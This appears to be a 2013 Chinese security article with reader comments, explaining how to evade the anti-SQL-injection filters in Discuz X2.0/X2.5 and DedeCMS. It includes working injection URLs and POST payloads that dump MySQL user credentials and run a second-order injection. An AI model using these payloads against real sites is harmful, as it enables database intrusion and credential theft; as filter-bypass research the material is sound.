@@ -1,0 +1,183 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">几种通用防注入程序绕过方法</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">genxor</a> <span class="bull">·</span> <time title="2013/07/29 17:16" ui-time="" datetime="2013/07/29 17:16" class="published ng-binding ng-isolate-scope">2013/07/29 17:16</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h3>0x00 前言</h3><hr><p>目前主流的CMS系统当中都会内置一些防注入的程序，例如Discuz、dedeCMS等，本篇主要介绍绕过方法。</p><h3>0x01 Discuz x2.0防注入</h3><hr><h4>防注入原理</h4><p>这里以Discuz最近爆出的一个插件的注入漏洞为例，来详细说明绕过方法。</p><p>漏洞本身很简单，存在于<strong>/source/plugin/v63shop/config.inc.php</strong>中的第29行getGoods函数中，代码如下所示</p><pre><code>#!php
+function getGoods($id){
+      $query = DB::query('select * from '.DB::table('v63_goods').' where `id` ='.$id);
+        $goods = DB::fetch($query);
+        $goods['endtime2'] = date('Y-m-d',$goods['endtime']);
+        $goods['price2'] = $goods['price'];
+        if($goods['sort'] ==2){
+            $goods['endtime2']= date('Y-m-d H:i:s',$goods['endtime']);
+            $query = DB::query("select * from ".DB::table('v63_pm')." where gid='$goods[id]' order by id desc ");
+            $last = DB::fetch($query);
+            if(is_array($last)){
+                $goods['price'] = $last['chujia'];
+                $goods['uid']  = $last['uid'];
+                $goods['username']  = $last['username'];
+                $goods['pm'] = $last;
+                if(time()+600&gt; $goods['endtime']){
+                    $goods['endtime'] = $last[time]+600;
+                    $goods['endtime2']= date('Y-m-d H:i:s',$last[time]+600);
+                }
+            }
+        }
+        return $goods;
+}
+</code></pre><p>触发漏洞的入口点在<strong>/source/plugin/v63shop/goods.inc.php</strong>中的第6行和第8行，如图所示： ￼ <img alt="enter image description here" img-src="fd58623f66afb6eae5ab209ad0aaa4cb08366816.jpg"></p><p>下面可以构造如下请求触发漏洞了，如图所示： ￼ <img alt="enter image description here" img-src="1e8f24c6431e33eadc386f723595ca3e12ef737e.jpg"></p><p>不过程序内置了一个&#95;do&#95;query_safe函数用来防注入，如图所示 ￼ <img alt="enter image description here" img-src="3ad75adb6679048413a62b361e8ef1b34ffdd485.jpg"></p><p>这里跟踪一下&#95;do&#95;query_safe()函数的执行，它会对以下关键字做过滤，如图所示：</p><p>￼<img alt="enter image description here" img-src="4d512d885750489b7b43db40b5fcf3a37895f3b6.jpg"></p><p>因为我们的url中出现了union select，所以会被过滤掉。</p><h4>绕过方法</h4><p>这里利用Mysql的一个特性绕过&#95;do&#95;query_safe函数过滤，提交如下url：</p><pre><code>http://localhost/discuzx2/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=1 and 1=2 union /*!50000select*/ 1,2,3,4,5,6,concat(user,0x23,password),8,9,10,11,12,13 from mysql.user
+</code></pre><p>这里我们跟踪一下，绕过的具体过程。它会将/**/中间的内容去掉，然后保存在$clean变量中，其值为</p><pre><code>select * from pre_v63_goods where `id` =1 and 1=2 union /**/ 1,2,3,4,5,6,concat(user,0x23,password),8,9,10,11,12,13 from mysql.user
+</code></pre><p>再进一步跟踪，它会将<code>/**/</code>也去掉，然对$clean变量做过滤，如图所示</p><p><img alt="enter image description here" img-src="70287768411f6b27036ffa50fd8e9b5db9887289.jpg"> ￼ 此时$clean值，如图所示 ￼ <img alt="enter image description here" img-src="7f6dee3158ab174dc0d5d2d8477c20c5fbe11455.jpg"></p><p>此时$clean变量中不在含有危险字符串，绕过&#95;do&#95;query_safe函数过滤，成功注入，截图如下： ￼ <img alt="enter image description here" img-src="7293b8de24a0afe82e6eb6079f167e986a66ed99.jpg"></p><h3>0x02 Discuz X2.5防注入</h3><hr><h4>防注入原理</h4><p>Discuz X2.5版修改了防注入函数的代码，在<strong>/config/config_global.php</strong>中有如下代码，如图所示 ￼ <img alt="enter image description here" img-src="ee59c9affe06d2d33a348994f1a01785c91464cf.jpg"></p><p>这里<code>$_config['security']['querysafe']['afullnote']</code> 默认被设置为0，重点关注这一点。</p><p>这里跟踪一下失败的原因，如图所示： ￼ <img alt="enter image description here" img-src="7f23fc8688073a0a69309ee77a16b6925362b965.jpg"></p><p>此时观察一下变量，&#95;do&#95;query_safe($sql)函数会将<code>/**/</code>中的内容去掉，然后存到$clean中，如图所示： ￼ <img alt="enter image description here" img-src="70b9bc7f4ce81de2a6b96a4f285decb5594fc9ec.jpg"></p><p>其实，程序执行到这里跟Discuz X2.0没有区别，$clean的值都一样。但是关键在下面，如图所示：</p><p><img alt="enter image description here" img-src="12f19d938f0302a6ef21974717148f5683dae232.jpg"> ￼ 因为前面提到$_config&#91;'security'&#93;&#91;'querysafe'&#93;['afullnote']=’0’，所以这里不会替换<code>/**/</code>为空，并且它在后面会判断$clean中是否会出现“/*”，如图所示： ￼ ￼<img alt="enter image description here" img-src="101c540ca450a5e579fef2e74e117f6204f4d639.jpg"></p><p>所以注入失败。</p><h4>绕过方法</h4><p>在Mysql当中，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="08eda692ecb181ed8790e18f87ef9ca048eda59fefa4ae">[email&#160;protected]</a>，可以用set @a=’abc’，来为变量赋值。这里为了合法的构造出一个单引号，目的是为了让sql正确，我们可以用@<code>'</code>放入sql语句当中，帮助我们绕过防注入程序检查。</p><p>这里利用如下方式绕过&#95;do&#95;query_safe函数过滤，如下所示：</p><pre><code>http://localhost/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=@`'` union select @`'`,2,3,4,5,6,7,concat(user,0x3a,password),9,10,11,12,13,14 from mysql.user
+</code></pre><p>这里跟踪一下执行的过程，如图所示：</p><p><img alt="enter image description here" img-src="2003c3f607231a5db70bb9ef2397d5949d1ea872.jpg"> ￼ 这里有一个if判断，重点看这句</p><pre><code>#!php
+$clean = preg_replace("/'(.+?)'/s", '', $sql);
+</code></pre><p>它会将$sql中单引号引起来的字符串省略掉，所以我们可以用绕过dede防住ids的思路，利用</p><pre><code>@`'` union select @`'`
+</code></pre><p>这样的方法，在下面的过滤中省掉union select，这里跟踪一下，如图所示： ￼ <img alt="enter image description here" img-src="d17c063f0cfcb68085f9e01bdf6b4d384a294fea.jpg"></p><p>这样便绕过了&#95;do&#95;query_safe函数检测，成功绕过防注入，如图所示： ￼ <img alt="enter image description here" img-src="1a3eaa62cd4d2bf158a73c4ccb7d0dccb46bd45f.jpg"></p><p>不过后来Discuz官方发布了一个修复补丁，但并没用从根本上解决问题。官方的修复代码如下： ￼ <img alt="enter image description here" img-src="e8f6cd793205d25ee484e6c3424bd6dd00cab9a4.jpg"></p><p>加了一个判断，过滤字符串中的@，但是始终没有修复根本问题，关键是上边的那个if判断会将单引号之间的内容（包括单引号）替换为空，代码如下：</p><pre><code>#!php
+if (strpos($sql, '/') === false &amp;&amp; strpos($sql, '#') === false &amp;&amp; strpos($sql, '-- ') === false) {
+    $clean = preg_replace("/'(.+?)'/s", '', $sql);
+}
+</code></pre><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6088dff989e7ec86e8f185efca88c6e187c8ed85e1fa84d8e084d8eb85eff886edc285d0d185efcf84dbc588cec92085cdf787ccc686d6e885c4d1">[email&#160;protected]</a>，从而绕过它的过滤，利用如下所示：</p><pre><code>http://localhost/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=`'` or @`''` union select 1 from (select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a)b where @`'`
+</code></pre><p>这里我引入了&#96;'&#96;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cc2b58642a516925565c245b432b606028744c2874668c29615b2b606a">[email&#160;protected]</a>，并将第一个@&#96;'&#96;替换为@&#96;''&#96;，这样便可以替换掉第二个@，这里我们跟踪一下代码，如图所示： ￼ <img alt="enter image description here" img-src="e852e5532f3ffb48e24c74865f70151470ec61b6.jpg"></p><p>可以看到$clean变为</p><pre><code>select * from pre_v63_goods where `id` =``
+</code></pre><p>成功绕过补丁，如图所示：</p><p><img alt="enter image description here" img-src="a3af538a145034c4a3322d50c3e322f0ae81f046.jpg"> ￼ 不过这样做的代价是不能再使用union select了，只能通过报错获取数据。</p><h3>0x03 DedeCMS防注入</h3><hr><h4>防注入原理</h4><p>这里我也以最近热点分析的dedeCMS feedback.php注入漏洞为例，分析如何绕过其防注入系统。不过在这之前，还得先提一下这个漏洞。</p><p>漏洞存在于/plus/feedback.php中的第244行，代码如下所示</p><pre><code>if($comtype == 'comments')
+    {
+        $arctitle = addslashes($title);
+        $typeid = intval($typeid);
+        $ischeck = intval($ischeck);
+        $feedbacktype = preg_replace("#[^0-9a-z]#i", "", $feedbacktype);
+        if($msg!='')
+        {
+            $inquery = "INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`)
+                   VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime', '{$cfg_ml-&gt;M_ID}','0','0','$feedbacktype','$face','$msg'); ";
+            $rs = $dsql-&gt;ExecuteNoneQuery($inquery);
+            if(!$rs)
+            {
+                ShowMsg(' 发表评论错误! ', '-1');
+                //echo $dsql-&gt;GetError();
+                exit();
+            }
+        }
+    }
+    //引用回复
+    elseif ($comtype == 'reply')
+    {
+        $row = $dsql-&gt;GetOne("SELECT * FROM `#@__feedback` WHERE id ='$fid'");
+        $arctitle = $row['arctitle'];
+        $aid =$row['aid'];
+        $msg = $quotemsg.$msg;
+        $msg = HtmlReplace($msg, 2);
+        $inquery = "INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)
+                VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime','{$cfg_ml-&gt;M_ID}','0','0','$feedbacktype','$face','$msg')";
+        $dsql-&gt;ExecuteNoneQuery($inquery);
+    }
+</code></pre><p>这里$title变量未初始化，所以$title可以作为可控变量，所以我们可以进一步控制$arctitle。跟踪发现$arctitle被直接带入SQL语句当中，但是这里执行的INSERT语句入库之后会将前面addslashes转义的单引号在会员还原回去。进一步跟踪下面的代码，在第268行，如下所示</p><pre><code>$row = $dsql-&gt;GetOne("SELECT * FROM `#@__feedback` WHERE id ='$fid'");
+$arctitle = $row['arctitle'];
+</code></pre><p>这里的查询#@__feedback表正式上面INSERT的那个表，arctitle字段取出来放到$arctitle变量当中，继续跟踪到第273行，这下豁然开朗了，</p><pre><code>$inquery = "INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)
+                VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime','{$cfg_ml-&gt;M_ID}','0','0','$feedbacktype','$face','$msg')";
+</code></pre><p>这里$arctitle变量未作任何处理，就丢进了SQL语句当中，由于我们可以控制$title，虽然$arctitle是被addslashes函数处理过的数据，但是被INSERT到数据库中又被还原了，所以综合起来这就造成了二次注入漏洞。</p><p>但是这里如何利用呢，通过跟踪代码发现，整个dede在整个过程中始终没有输出信息，所以我们无法通过构造公式报错来获取数据，但是进一步分析代码发现#@__feedback表当中的msg字段会被输出。由于$arctitle变量是可控的，所以我们可以通过构造SQL语句，将我们要执行的代码插入到msg字段当中，这样便可以输出执行的内容了。</p><h4>绕过方法</h4><p>众所周知，dedeCMS内置了一个CheckSql()函数用来防注入，它是80sec开发的通用防注入ids程序，每当执行sql之前都要用它来检查一遍。其代码如下所示：</p><pre><code>#!php
+function CheckSql($db_string,$querytype='select')
+    {
+        global $cfg_cookie_encode;
+        $clean = '';
+        $error='';
+        $old_pos = 0;
+        $pos = -1;
+        $log_file = DEDEINC.'/../data/'.md5($cfg_cookie_encode).'_safe.txt';
+        $userIP = GetIP();
+        $getUrl = GetCurUrl();
+
+        //如果是普通查询语句，直接过滤一些特殊语法
+        if($querytype=='select')
+        {
+            $notallow1 = "[^0-9a-z@\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]{1,}";
+
+            //$notallow2 = "--|/\*";
+            if(preg_match("/".$notallow1."/i", $db_string))
+            {
+                fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||SelectBreak\r\n");
+                exit("&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 1 !&lt;/font&gt;");
+            }
+        }
+
+        //完整的SQL检查
+        while (TRUE)
+        {
+            $pos = strpos($db_string, '\'', $pos + 1);
+            if ($pos === FALSE)
+            {
+                break;
+            }
+            $clean .= substr($db_string, $old_pos, $pos - $old_pos);
+            while (TRUE)
+            {
+                $pos1 = strpos($db_string, '\'', $pos + 1);
+                $pos2 = strpos($db_string, '\\', $pos + 1);
+                if ($pos1 === FALSE)
+                {
+                    break;
+                }
+                elseif ($pos2 == FALSE || $pos2 &gt; $pos1)
+                {
+                    $pos = $pos1;
+                    break;
+                }
+                $pos = $pos2 + 1;
+            }
+            $clean .= '$s$';
+            $old_pos = $pos + 1;
+        }
+        $clean .= substr($db_string, $old_pos);
+        $clean = trim(strtolower(preg_replace(array('~\s+~s' ), array(' '), $clean)));
+
+        //老版本的Mysql并不支持union，常用的程序里也不使用union，但是一些黑客使用它，所以检查它
+        if (strpos($clean, 'union') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="union detect";
+        }
+
+        //发布版本的程序可能比较少包括--,#这样的注释，但是黑客经常使用它们
+        elseif (strpos($clean, '/*') &gt; 2 || strpos($clean, '--') !== FALSE || strpos($clean, '#') !== FALSE)
+        {
+            $fail = TRUE;
+            $error="comment detect";
+        }
+
+        //这些函数不会被使用，但是黑客会用它来操作文件，down掉数据库
+        elseif (strpos($clean, 'sleep') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="slown down detect";
+        }
+        elseif (strpos($clean, 'benchmark') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="slown down detect";
+        }
+        elseif (strpos($clean, 'load_file') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="file fun detect";
+        }
+        elseif (strpos($clean, 'into outfile') !== FALSE &amp;&amp; preg_match('~(^|[^a-z])into\s+outfile($|[^[a-z])~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="file fun detect";
+        }
+
+        //老版本的MYSQL不支持子查询，我们的程序里可能也用得少，但是黑客可以使用它来查询数据库敏感信息
+        elseif (preg_match('~\([^)]*?select~s', $clean) != 0)
+        {
+            $fail = TRUE;
+            $error="sub select detect";
+        }
+        if (!empty($fail))
+        {
+            fputs(fopen($log_file,'a+'),"$userIP||$getUrl||$db_string||$error\r\n");
+            exit("&lt;font size='5' color='red'&gt;Safe Alert: Request Error step 2!&lt;/font&gt;");
+        }
+        else
+        {
+            return $db_string;
+        }
+    }
+</code></pre><p>但通过跟踪这段代码发现，它有个特征就是会将两个单引号之间的内容用$s$替换，例如’select’会被替换为$s$，这里用两个@&#96;'&#96;包含敏感字，这样$clean变量中就不会出现敏感字，从而绕过CheckSql()函数检测。</p><p>这里可以设置title为如下代码，一方面绕过ids防注入代码检测，另一方面加一个#注释掉后面的代码，但是还要做一下变形，就是这个char(@&#96;'&#96;)了。因为#@__feedback的所有字段都被设置为NOT NULL，而@&#96;'&#96;是一个变量，默认为NULL，直接插入@&#96;'&#96;的话会报错，所以需要以char(@&#96;'&#96;)的方法转换一下。</p><pre><code>',char(@`'`),1,1,1,1,1,1,1,(SELECT user()))#,(1,
+</code></pre><p>跟踪代码，如图所示 ￼ <img alt="enter image description here" img-src="deadf294d7099496e901ea609720d76bc97f890a.jpg"></p><p>如下SQL语句</p><pre><code>INSERT INTO `dede_feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`) VALUES ('1','1','游客','\',char(@`\'`),1,1,1,1,1,1,1,(SELECT user()))#,(1,','127.0.0.1','1','1364401789', '0','0','0','feedback','1','genxor');
+</code></pre><p>被替换为了</p><pre><code>insert into `dede_feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`) values ($s$,$s$,$s$,$s$,$s$,$s$,$s$, $s$,$s$,$s$,$s$,$s$,$s$);
+</code></pre><p>字符串中没有任何敏感字，成功绕过CheckSql()函数检测。</p><p>POST如下请求给feedback.php，如下所示：</p><pre><code>   action=send&amp;comtype=comments&amp;aid=1&amp;isconfirm=yes&amp;feedbacktype=feedback&amp;face=1&amp;msg=genxor&amp;notuser=1&amp;typeid=1&amp;title=',char(@`'`),1,1,1,1,1,1,1,(SELECT user()))#,(1,
+</code></pre><p>跟踪代码，实际执行的SQL语句跟踪变量如下所示： ￼ <img alt="enter image description here" img-src="43c299867d7f7640df4c1b9dfd626359a24360f0.jpg"></p><p>被插入数据库中的内容，如图所示： ￼ <img alt="enter image description here" img-src="9a75953ed3b3abb47e210306b717415e289c535b.jpg"></p><p>下面再POST如下内容给feedback.php，</p><pre><code>action=send&amp;comtype=reply&amp;aid=1&amp;isconfirm=yes&amp;feedbacktype=feedback&amp;fid=50
+</code></pre><p>跟踪一下这里执行的SQL语句，如图所示 ￼ <img alt="enter image description here" img-src="67b29a48fb37e035ee03f3442522572002e02482.jpg"></p><p>所以select user()执行了，并且可以作为msg字段输出。</p><h3>0x04 总结</h3><hr><p>在写这篇文章之前，我分析了很多常用的cms系统的源码，包括discuz、dedecms、phpwind、phpcms等，只有在discuz、dedecms这两个系统中用到通用防注入，但是它们所覆盖的用户群已将相当庞大了。如果能在发现程序注入漏洞的情况下，这些绕过方法还是很有价值的。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/3790" rel="bookmark" id="re1">Webscan360的防御与绕过</a></li><li><a href="http://drops.wooyun.org/papers/831" rel="bookmark" id="re2">并发请求导致的业务处理安全风险及解决方案</a></li><li><a href="http://drops.wooyun.org/papers/1321" rel="bookmark" id="re3">wechall mysql关卡题解</a></li><li><a href="http://drops.wooyun.org/tips/123" rel="bookmark" id="re4">MySql注入科普</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kite</span> <span class="reply-time">2016-02-28 09:43:26</span></div><p></p><p>受益匪浅</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2016-01-10 14:13:01</span></div><p></p><p>代码审计牛，厉害啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">雏鹰</span> <span class="reply-time">2015-05-12 17:37:49</span></div><p></p><p>安恒面试题就是这个问题。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">树上草</span> <span class="reply-time">2014-08-16 07:10:13</span></div><p></p><p>看不懂啊= =</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bitcoin</span> <span class="reply-time">2014-08-11 14:57:45</span></div><p></p><p>学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">joker</span> <span class="reply-time">2014-06-23 10:22:13</span></div><p></p><p>看界面可能是eclipse吧，加了个PHP的调试插件。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Lamzo</span> <span class="reply-time">2014-06-06 16:36:41</span></div><p></p><p>That's an inunieogs way of thinking about it.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">@'</span> <span class="reply-time">2014-06-06 00:09:45</span></div><p></p><p>比如呢？现在都推荐预编译sql,这种做法真的就可以安枕无忧？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ver007</span> <span class="reply-time">2014-06-05 23:08:51</span></div><p></p><p>想问下变量跟踪的工具叫什么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Comer</span> <span class="reply-time">2014-04-27 19:56:53</span></div><p></p><p>收了，壮大payloads库~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">少校</span> <span class="reply-time">2014-04-27 03:36:19</span></div><p></p><p>过滤了union select 何解？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">存在敏感词</span> <span class="reply-time">2013-12-08 09:49:06</span></div><p></p><p>写的很不错啊。 找到了一直困扰我的问题的答案</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Holiday0</span> <span class="reply-time">2013-09-06 17:26:38</span></div><p></p><p>感觉是vs+插件</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzzhhh</span> <span class="reply-time">2013-09-05 23:31:08</span></div><p></p><p>@genxor</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzzhhh</span> <span class="reply-time">2013-09-05 23:30:48</span></div><p></p><p>那个跟踪变量的工具叫什么，是IDE么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nimda</span> <span class="reply-time">2013-08-06 10:21:58</span></div><p></p><p>那个跟踪变量的工具叫什么，是IDE么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jk_影</span> <span class="reply-time">2013-08-04 22:02:31</span></div><p></p><p>我也想知道楼主用什么来调试的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-08-04 14:52:48</span></div><p></p><p>有没有想过pdo的底层实现也会出事？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">nyannyannyan</span> <span class="reply-time">2013-07-31 19:11:37</span></div><p></p><p>我觉得不用pdo做sql参数化传递..老搞拼接这一套就永远会出事</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冰杰</span> <span class="reply-time">2013-07-30 22:47:47</span></div><p></p><p>碉堡~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">genxor</span> <span class="reply-time">2013-07-30 22:36:15</span></div><p></p><p>日你</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ccSec</span> <span class="reply-time">2013-07-30 20:13:31</span></div><p></p><p>超屌的文章，想问下LZ是用什么IDE来调试PHP的~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">疯狂的dabing</span> <span class="reply-time">2013-07-30 16:08:47</span></div><p></p><p>以前觉得80sec那个防注入写的非常好，把所有的程序都加上了这段代码。。。直到后来一个dedecms被黑了，从日志中找到了@`'`。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Gavin</span> <span class="reply-time">2013-07-30 09:39:34</span></div><p></p><p>lz是骚货</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">酱油甲</span> <span class="reply-time">2013-07-29 22:11:11</span></div><p></p><p>涨姿势了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">有妹子送上</span> <span class="reply-time">2013-07-29 18:42:52</span></div><p></p><p>涨姿势了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">nauscript</span> <span class="reply-time">2013-07-29 17:26:12</span></div><p></p><p>很详细 有没有关于绕过D盾的例子</p><p></p></div></div></div></div></div></main>
